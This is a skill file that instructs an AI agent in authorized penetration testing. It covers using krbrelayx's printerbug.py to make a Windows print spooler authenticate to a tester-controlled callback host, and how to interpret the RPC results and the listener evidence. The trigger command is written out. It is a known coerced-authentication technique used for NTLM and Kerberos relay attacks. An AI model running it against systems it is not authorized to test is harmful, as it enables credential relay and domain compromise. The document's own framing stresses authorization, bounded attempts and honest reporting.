---
name: printerbug
description: Trigger one authorized Windows spooler RPC authentication callback with krbrelayx printerbug from Linux. Use to distinguish RPC bind, notification errors and independently observed NTLM or Kerberos backconnects.
---


# Correlate the spooler request with its callback

Read this entire SKILL.md before acting. Require the selected Windows source host, known RPC identity, callback endpoint and ready owned listener. Finish with the source/protocol/principal observed at that listener or an honest unresolved trigger; the script's final message is not callback proof.

Use `printerbug.py` from dirkjanm's krbrelayx. Define `script` as its local reviewed path, `domain`, `account`, `source_host` and `callback_host` as the selected values. Inspect its installed help. This makes a remote spooler notification request and causes an outbound authentication attempt when the source/configuration permits it:

~~~bash
python3 "$script" "$domain/$account@$source_host" "$callback_host"
~~~

Omitting the password prompts in this CLI. The first target is the host asked to connect back; the second is the hostname it will contact. A callback hostname can determine Kerberos SPN selection as well as network resolution. Use the exact intended name, not an arbitrary IP replacement, when testing that behavior.

`Bind OK` and a printer handle establish earlier RPC stages. The notification call can return `rpc_s_access_denied` even when an outbound request follows. Conversely, `Triggered RPC backconnect, this may or may not have worked` is explicitly uncertain. Check the actual listener trace before reporting success or repeating the trigger. A TCP connection is not a completed authentication exchange; keep NTLM and Kerberos distinct.

Unavailable spooler, RPC/firewall policy, permission denial, DNS/SPN failure or the callback's route can stop different stages. Wrapping this TCP RPC client in a proxy does not carry the Windows source's outbound callback automatically. Prepare that source-to-listener route separately. Stop after the bounded attempt and preserve the correlated result. See [upstream implementation](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py).
